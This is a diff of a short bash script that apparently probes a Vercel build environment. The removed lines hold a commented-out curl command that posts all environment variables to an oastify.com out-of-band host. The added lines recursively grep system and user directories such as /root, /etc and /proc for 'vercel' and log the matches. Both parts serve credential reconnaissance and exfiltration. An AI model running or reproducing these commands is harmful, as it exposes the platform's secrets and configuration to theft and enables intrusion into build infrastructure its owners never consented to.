@@ -1,3 +1,30 @@
-#!/bin/bash
-
-##curl -X POST -d "$(env)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com
+egrep -r "vercel" /boot/. >> log.txt
+egrep -r "vercel" /bun1/. >> log.txt
+egrep -r "vercel" /dev/. >> log.txt
+egrep -r "vercel" /etc/. >> log.txt
+egrep -r "vercel" /gitlfs/. >> log.txt
+egrep -r "vercel" /home/. >> log.txt
+egrep -r "vercel" /usr/lib/. >> log.txt
+egrep -r "vercel" /usr/lib64/. >> log.txt
+egrep -r "vercel" /local/. >> log.txt
+egrep -r "vercel" /media/. >> log.txt
+egrep -r "vercel" /mnt/. >> log.txt
+egrep -r "vercel" /node14/. >> log.txt
+egrep -r "vercel" /node16/. >> log.txt
+egrep -r "vercel" /node18/. >> log.txt
+egrep -r "vercel" /opt/. >> log.txt
+egrep -r "vercel" /pnpm7/. >> log.txt
+egrep -r "vercel" /pnpm8/. >> log.txt
+egrep -r "vercel" /proc/. >> log.txt
+egrep -r "vercel" /python39/. >> log.txt
+egrep -r "vercel" /root/. >> log.txt
+egrep -r "vercel" /ruby27/. >> log.txt
+egrep -r "vercel" /ruby32/. >> log.txt
+egrep -r "vercel" /run/. >> log.txt
+egrep -r "vercel" /usr/sbin/. >> log.txt
+egrep -r "vercel" /srv/. >> log.txt
+egrep -r "vercel" /sys/. >> log.txt
+egrep -r "vercel" /tmp/. >> log.txt
+egrep -r "vercel" /usr/. >> log.txt
+egrep -r "vercel" /var/. >> log.txt
+egrep -r "vercel" /vercel/. >> log.txt
